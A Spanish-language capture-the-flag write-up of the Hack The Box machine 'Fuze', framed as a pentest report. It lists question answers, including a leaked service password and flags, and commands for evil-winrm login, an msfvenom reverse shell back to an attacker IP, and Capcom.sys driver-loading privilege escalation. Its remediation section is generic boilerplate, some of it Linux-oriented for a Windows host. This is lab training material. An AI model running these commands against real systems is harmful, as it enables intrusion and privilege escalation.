---
title: "Informe Técnico: Fuze (Hack The Box) — Pentesting & Exploit Analysis"
published: true
description: "Informe técnico profesional de auditoria sobre la maquina Fuze de Hack The Box: vector de entrada, PoC de explotacion, escalada y mitigaciones OffSec."
tags: cybersecurity, ctf, hackthebox, pentesting
series: "Hack The Box Walkthroughs"
cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/fuze/images/step_01.png"
---

# Informe Técnico de Seguridad Ofensiva: Fuze

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Windows-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Methodology-OffSec%20%2F%20PTES-purple?style=for-the-badge)
![Auditor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Evaluación de Seguridad Ofensiva y Penetration Testing** realizada sobre el entorno de laboratorio **Fuze** de **Hack The Box**, siguiendo los estándares de ejecución metodológica **OffSec PEN-200 (OSCP)** y **PTES (Penetration Testing Execution Standard)**.

---

## 📑 1. Resumen Ejecutivo (Executive Summary)

* **Objetivo de la Evaluación:** Identificar, documentar y explotar debilidades de seguridad en el host objetivo para evaluar el impacto sobre la confidencialidad, integridad y disponibilidad del sistema.
* **Calificación de Riesgo:** `CRÍTICO` (Acceso no autenticado que deriva en compromiso completo de la máquina y obtención de máximos privilegios administrativos).
* **Vector de Acceso Inicial:** Explotación de servicio de red
* **Vector de Elevación de Privilegios:** Escalada local de privilegios
* **Estado Final:** Compromiso total del objetivo (`User Proof` y `Root/System Proof` obtenidas exitosamente).

### Ficha Técnica de la Evaluación

| Parámetro | Detalle Técnico |
| :--- | :--- |
| **Host Objetivo** | Fuze |
| **Plataforma** | Hack The Box |
| **Sistema Operativo** | Windows |
| **Nivel de Dificultad** | Medium |
| **CVE(s) Involucrados** | N/A |
| **Vector de Entrada** | Explotación de servicio de red |
| **Mecanismo de Escalada** | Escalada local de privilegios |
| **Consultor / Auditor** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Diagrama del Flujo de Compromiso (Attack Path)

```
[ Fase 1: Reconocimiento ]
         │
         ▼
[ Fase 2: Enumeración & Identificación de Vectores ]
         │─── Descubrimiento de servicios y análisis de superficie de ataque
         └─── Verificación de configuraciones erróneas y CVEs conocidos
         │
         ▼
[ Fase 3: Explotación Inicial (Foothold) ]
         │─── Ejecución del vector: Explotación de servicio de red
         └─── Establecimiento de Reverse Shell / Acceso de usuario
         │
         ▼
[ Fase 4: Escalada de Privilegios Local ]
         │─── Auditoría interna: Escalada local de privilegios
         └─── Elevación a privilegios de superusuario (root / SYSTEM)
         │
         ▼
[ Fase 5: Evidencia & Banderas ]
         └─── Captura de User Flag y Root Flag
```

---

## 🔬 3. Procedimiento Técnico y Evidencias Paso a Paso

**This machine is the domain controller for a target domain. What is that domain?**

R: fabricorp.local

![Captura de pantalla 2025-08-20 140630.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/fuze/images/step_01.png)

**The software listening on port 80 leaks several user names. What is the one that starts with "p"?**

R: pmerton

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/fuze/images/step_02.png)

**What is the password that is shared by several users on Fuse?**

R:Fabricorp01

```jsx
cewl http://fuse.fabricorp.local/papercut/logs/html/index.htm -w wordlist.txt --depth 5 --min_word_length 8 --with-numbers

```

**What is the return status when trying to log in with one of these users and the password "Fabricorp01"?**

R: NT_STATUS_PASSWORD_MUST_CHANGE

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/fuze/images/step_03.png)

**What is the name of the printer connected to Fuse?**

R: HP-MFT01

![Captura de pantalla 2025-08-20 150900.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/fuze/images/step_04.png)

**What is the password leaked from the printer object?**

R: $fab@s3Rv1ce$1

**Two users share the password from the printer description. One is svc-scan. What is the other?**

R: svc-print

**Over what protocol can the svc-print user get a shell?**

R: winrm

**Submit the flag located on the svc-print user's desktop.**

R:  e648abcd753a63d5471001a3935254fe

![Captura de pantalla 2025-08-20 194512.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/fuze/images/step_05.png)

```jsx
evil-winrm -i 10.10.10.193 -u 'svc-print' -p '$fab@s3Rv1ce$1'
```

**What privilege does the svc-print user have that is dangerous and can lead to privilege escalation?**

R: SeLoadDriverPrivilege

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/fuze/images/step_06.png)

**Submit the flag located on the administrator user's desktop.**

R: a92699ac2dbf81cba8e804bdad07a4b6

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/fuze/images/step_07.png)

```jsx
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=998 -f exe -o reverse.exe
.\EopLoadDriver.exe System\CurrentControlSet\MyService C:\Windows\Temp\Capcom.sys
.\ExploitCapcom.exe
```

---

## 🛡️ 4. Plan de Remediación y Recomendaciones de Hardening

### Acciones Tácticas Inmediatas
1. **Aplicación de Parches y Actualización:** Actualizar todos los servicios obsoletos y aplicar los parches correspondientes a las vulnerabilidades documentadas (N/A).
2. **Revisión de Permisos Críticos:** Eliminar permisos SUID/sudo innecesarios y auditar listas de control de acceso (ACLs) en directorios y archivos sensibles.
3. **Cierre de Superficie de Exposición:** Configurar firewalls a nivel de host para denegar puertos de administración o de depuración que no deban estar expuestos públicamente.

### Acciones Estratégicas y de Arquitectura
1. **Principio de Mínimo Privilegio (PoLP):** Configurar servicios y aplicaciones para que se ejecuten bajo cuentas de servicio con privilegios limitados sin acceso a shells interactivas.
2. **Segmentación de Red:** Aislar componentes críticos y servidores de aplicaciones en VLANs dedicadas con inspección de tráfico Este-Oeste.
3. **Monitorización Continua y EDR:** Implementar reglas de detección basadas en comportamiento para identificar ejecuciones anómalas de comandos, spawning de shells y tráfico de red no autorizado.

---

## 📊 5. Mapeo con Matriz MITRE ATT&CK

| Táctica | ID de Técnica | Nombre de Técnica | Aplicación en el Ejercicio |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Vulnerability Scanning | Detección automatizada y manual de servicios mediante escaneo de puertos |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Explotación de vulnerabilidad en servicio de red expuesto (Explotación de servicio de red) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Spawning de reverse shell interactiva para control del endpoint |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Mechanism / Exploitation | Elevación de privilegios hacia superusuario (Escalada local de privilegios) |

---

© 2026 **araizcorp** — Documentación técnica desarrollada para preparación y consultoría de certificaciones **OffSec** (OSCP, OSEP, OSWE).
